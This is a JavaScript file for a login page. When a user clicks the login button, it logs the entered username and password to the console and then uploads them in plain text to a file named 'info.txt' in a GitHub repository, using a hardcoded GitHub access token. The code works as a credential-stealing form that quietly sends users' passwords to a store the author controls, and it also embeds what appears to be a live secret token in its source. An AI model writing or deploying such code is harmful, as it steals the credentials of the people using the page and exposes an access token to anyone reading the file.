const username = document.querySelector('.username')
const password = document.querySelector('.password')


document.querySelector('.loginButton').addEventListener('click', () => {
  if (username.value ==='' || password.value ==='') {
      console.log('empty');
  }else {
      console.log(username.value, password.value);
      const repoOwner = 'Arnav-lunatic'
      const repoName = 'info'
      const filePath = 'info.txt'
      const githubToken = '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'
      const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`

      const newTextContent = `username - "${username.value}" | password - "${password.value}"`

      const updateFile = async () => {
        try {
          const response = await fetch(apiUrl, {
            method: 'PUT',
            headers: {
              'Authorization': `token ${githubToken}`,
              'Accept': 'application/vnd.github.v3+json',
            },
            body: JSON.stringify({
              message: 'Update text file',
              content: btoa(newTextContent), // Encode the new text content in base64
              sha: '8b137891791fe96927ad78e64b0aad7bded08bdc', // You need to fetch the current SHA of the file first
            }),
          });

          if (response.status === 200) {
            console.log('File updated successfully.');
          } else {
            console.error('Error updating file:', response.status, response.statusText);
          }
        } catch (error) {
          console.error('Error updating file:', error);
        }
      };

      // Call the function to update the file
      updateFile();
  }
})